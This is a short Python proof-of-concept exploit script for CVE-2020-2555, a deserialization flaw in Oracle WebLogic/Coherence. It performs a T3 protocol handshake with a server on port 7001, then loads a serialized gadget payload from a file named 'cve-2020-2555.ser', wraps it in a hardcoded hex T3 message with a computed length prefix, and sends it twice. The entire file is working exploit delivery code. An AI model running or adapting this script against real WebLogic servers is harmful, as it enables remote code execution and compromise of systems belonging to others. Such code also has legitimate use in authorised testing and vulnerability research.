import binascii
import socket
import time


def T3():
    hello = 't3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
    host = ('127.0.0.1', 7001)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    sock.connect(host)
    sock.send(hello.encode('utf-8'))
    time.sleep(1)
    resp1 = sock.recv(1024)
    print(resp1)

    data1 = '016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000'
    with open('cve-2020-2555.ser', 'rb') as f:
        a = binascii.b2a_hex(f.read()).decode('utf-8')
        print(a)
    data = data1 + a

    data = '%s%s' % ('{:08x}'.format(len(data) // 2 + 4), data)
    sock.send(binascii.a2b_hex(data))
    time.sleep(2)
    sock.send(binascii.a2b_hex(data))


if __name__ == "__main__":
    T3()
